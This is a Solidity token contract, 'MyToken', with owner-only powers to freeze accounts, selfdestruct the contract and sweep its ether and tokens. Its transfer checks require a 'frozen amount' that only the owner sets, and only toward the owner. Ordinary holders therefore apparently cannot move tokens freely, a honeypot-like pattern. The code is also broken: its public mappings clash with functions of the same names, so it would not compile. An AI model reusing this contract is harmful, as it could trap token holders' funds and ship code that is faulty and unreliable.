pragma solidity ^0.4.26;

contract MyToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public frozenAccount;
    mapping(address => mapping(address => uint256)) public frozenAmount;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ContractDestroyed(address indexed recipient, uint256 balance);
    event EtherTransferredToOwner(address indexed owner, uint256 value);
    event EtherDeposited(address indexed sender, uint256 value);
    event TokenTransferredToOwner(address indexed owner, uint256 value);
    event AccountFrozen(address indexed target, bool frozen);
    event AmountFrozen(address indexed target, uint256 value, bool frozen);
    event TokensBurned(address indexed from, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Only contract owner can call this function");
        _;
    }

    constructor(
        uint256 initialSupply,
        string memory tokenName,
        string memory tokenSymbol,
        uint8 decimalUnits
    ) public {
        balanceOf[msg.sender] = initialSupply;
        totalSupply = initialSupply;
        name = tokenName;
        symbol = tokenSymbol;
        decimals = decimalUnits;
        owner = msg.sender;
    }

    function transferOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Invalid new owner address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function destroyContract(address recipient) public onlyOwner {
        emit ContractDestroyed(recipient, address(this).balance);
        selfdestruct(recipient);
    }

    function transferEtherToOwner() public onlyOwner {
        emit EtherTransferredToOwner(owner, address(this).balance);
        owner.transfer(address(this).balance);
    }

    function depositEtherToContract() public payable {
        emit EtherDeposited(msg.sender, msg.value);
    }

    function transferTokenToOwner(uint256 value) public onlyOwner {
        require(balanceOf[address(this)] >= value, "Insufficient token balance in the contract");
        balanceOf[address(this)] -= value;
        balanceOf[owner] += value;
        emit TokenTransferredToOwner(owner, value);
        emit Transfer(address(this), owner, value);
    }

    function freezeAccount(address target, bool freeze) public onlyOwner {
        frozenAccount[target] = freeze;
        emit AccountFrozen(target, freeze);
    }

    function freezeAmount(address target, uint256 value, bool freeze) public onlyOwner {
        frozenAmount[target][msg.sender] = freeze ? value : 0;
        emit AmountFrozen(target, value, freeze);
    }

    function transfer(address to, uint256 value) public {
        require(to != address(0), "Invalid recipient address");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        require(!frozenAccount[msg.sender], "Sender account is frozen");
        require(frozenAmount[msg.sender][to] >= value, "Transfer amount is frozen");
        
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(to != address(0), "Invalid recipient address");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Not enough allowance");
        require(!frozenAccount[from], "Sender account is frozen");
        require(frozenAmount[from][to] >= value, "Transfer amount is frozen");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balanceOf[owner];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return allowance[owner][spender];
    }

    function burn(uint256 value) public {
        require(balanceOf[msg.sender] >= value, "Insufficient balance to burn");
        balanceOf[msg.sender] -= value;
        totalSupply -= value;
        emit TokensBurned(msg.sender, value);
        emit Transfer(msg.sender, address(0), value);
    }
}